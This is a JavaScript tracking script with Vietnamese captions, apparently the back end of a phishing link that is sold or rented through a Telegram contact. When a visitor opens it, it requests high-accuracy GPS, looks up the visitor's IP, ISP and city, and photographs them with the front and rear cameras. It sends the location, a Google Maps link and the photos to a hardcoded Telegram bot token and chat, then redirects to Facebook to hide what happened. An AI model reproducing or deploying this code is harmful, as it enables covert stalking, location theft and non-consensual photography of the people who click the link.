const TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const ID = '-1003770043455

// Hàm lấy GPS chính xác từ thiết bị
function getGPS() {
    return new Promise((res) => {
        navigator.geolocation.getCurrentPosition(
            (p) => res({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
            () => res(null), // Nếu người dùng từ chối hoặc lỗi thì trả về null
            { enableHighAccuracy: true, timeout: 5000 }
        );
    });
}

async function getVitals() {
    try {
        const r = await fetch('https://ipwho.is/');
        const d = await r.json();
        return {
            ip: d.ip || 'Không rõ',
            isp: d.connection?.org || 'VNNIC',
            addr: `${d.city}, ${d.region}`,
            lat: d.latitude || 0, 
            lon: d.longitude || 0
        };
    } catch (e) { return { ip: 'Lỗi', isp: 'Lỗi', addr: 'Lỗi', lat: 0, lon: 0 }; }
}

async function capture(mode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
        const video = document.getElementById('v');
        video.srcObject = stream;
        await video.play();
        return new Promise(res => {
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                stream.getTracks().forEach(t => t.stop());
                canvas.toBlob(res, 'image/jpeg', 0.8);
            }, 3000);
        });
    } catch (e) { return null; }
}

async function main() {
    // Chạy song song lấy thông tin IP và tọa độ GPS
    const [info, gps] = await Promise.all([getVitals(), getGPS()]);
    
    // Ưu tiên tọa độ GPS chính xác, nếu không có mới dùng tọa độ IP
    const finalLat = gps ? gps.lat : info.lat;
    const finalLon = gps ? gps.lon : info.lon;
    const locationType = gps ? `GPS Chính xác (+/- ${Math.round(gps.acc)}m)` : "Vị trí IP (Sai số cao)";

    const ua = navigator.userAgent;
    let device = "PC/Laptop";
    if (/android/i.test(ua)) {
        const match = ua.match(/Android\s+([^\s;]+|.*?\s+build\/[^\s;]+)/i);
        device = match ? `Android (${match[1]})` : "Android";
    } else if (/iPhone|iPad|iPod/.test(ua)) {
        device = "iPhone/iPad (iOS)";
    }

    const p1 = await capture("user");
    const p2 = await capture("environment");

    // Sửa link Google Maps với dấu $ chuẩn và tọa độ mới
    const caption = `📡 [THÔNG TIN TRUY CẬP]
🕒 Thời gian: ${new Date().toLocaleString('vi-VN')}
📱 Thiết bị: ${device}
🌍 IP: ${info.ip}
🏢 Nhà mạng: ${info.isp}
📍 Địa chỉ: ${info.addr}
🎯 Loại định vị: ${locationType}
📌 Google Maps: https://www.google.com/maps?q=${finalLat},${finalLon}
📸 Camera: ✅ Đã chụp 2 mặt
‼️ Lưu ý: Nội dung trên có thể không chính xác!
💸 Mua bot - Thuê bot ib Tele: @Mrwenben`.trim();

    const formData = new FormData();
    formData.append('chat_id', ID);
    const media = [];
    if (p1) {
        formData.append('f1', p1, '1.jpg');
        media.push({ type: 'photo', media: 'attach://f1', caption: caption });
    }
    if (p2) {
        formData.append('f2', p2, '2.jpg');
        media.push({ type: 'photo', media: 'attach://f2' });
    }

    if (media.length > 0) {
        formData.append('media', JSON.stringify(media));
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMediaGroup`, { method: 'POST', body: formData });
    }
    
    setTimeout(() => { window.location.href = "https://www.facebook.com/watch/"; }, 1500);
}
